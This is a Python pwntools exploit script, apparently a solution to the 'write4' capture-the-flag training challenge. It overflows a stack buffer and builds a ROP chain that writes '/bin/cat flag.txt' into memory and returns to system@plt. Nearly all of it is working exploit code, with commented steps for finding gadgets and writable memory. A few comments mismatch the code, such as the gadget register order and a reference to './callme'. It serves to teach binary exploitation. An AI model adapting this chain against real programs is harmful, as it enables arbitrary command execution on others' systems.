#!/usr/bin/env python2
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template sum
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('write4')
context.terminal = "terminator -x".split()

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
break *0x{exe.symbols.pwnme:x}
break *0x0000000000400805
continue
'''.format(**locals())

io = start()

# This program has a buffer overflow. The pwnme() function
# calls fgets(buf, 50, stdin), although the buffer is only
# 32 bytes large ...

# Just look at 'objdump -M intel -d ./callme'. In addition to
# the usual main() calling pwnme(), you'll see the usefulGadgets()
# function containing the gadget "mov [r15], r14; ret", which
# allows us to write what we want where we want, assuming we
# are able to load r14 and r15. This is possible with another
# gadget 'pop r14; pop r15; ret', found with ropper
#
#    $ ropper -f write4 --type=rop --search='pop r14'
#
# The plan is to write a ROP chain that does the following:
#   - Write "/bin/sh" to a fixed address
#   - Load the fixed address into rdi 
#   - Return to system@plt
#
# We need to find a place to store the string to be crafted,
# and we want it to have a fixed address (assuming PIE is disabled).
# We could look for writable sections using rabin2:
#
#    $ rabin2 -S write4
#
# But the problem is that sections may be overlapped, so it's not
# easy to understand whether a certain range of addresses is actually
# writable. A better approach is to look at vmmap (gdb command),
# which also shows address ranges and permissions.
# Or even look at the program headers of the ELF (readelf -Wl).

# Wait for the prompt.
msg = io.recvuntil("> ")
print(msg)
# Build the input vector as 40 arbitrary bytes plus the ROP chain,
# that will overwrithe the saved RIP.
vector = "B" * 40

def append_write(chain, addr, value):
    # Return address of the gadget "pop r14; pop r15; ret;"
    chain += p64(0x400890)
    # The values for r14
    chain += p64(addr)
    # The values for r15
    chain += p64(value)
    # Return address of the gadget "mov qword ptr [r14], r15; ret;"
    chain += p64(0x400820)

    return chain

def write_string(chain, addr, s):
    s += '\x00' * (8 - (len(s) % 8))
    i = 0
    while i < len(s):
        chain = append_write(chain, addr + i, u64(s[i:i+8]))
        i += 8

    return chain

# We will write somewhere in the middle of the range [0x601000,0x602000),
# which is writable, as shown by vmmap. Writing to the beginning of
# this range also works if we only write 8 bytes (writing more than
# that will crash the program before we can get to execute the
# desired command... remember that we are corrupting memory, so who
# knows why we get a crash).
dest_addr = 0x601f00

vector = write_string(vector, dest_addr, '/bin/cat flag.txt')

# Append the address of a 'pop rdi; ret' gadget,
# and the value of rdi (address of the crafted string).
vector += p64(0x400893)
vector += p64(dest_addr)

# Return to system@plt (rabin2 -i ./write4)
vector += p64(0x004005e0)

io.sendline(vector)
io.interactive()
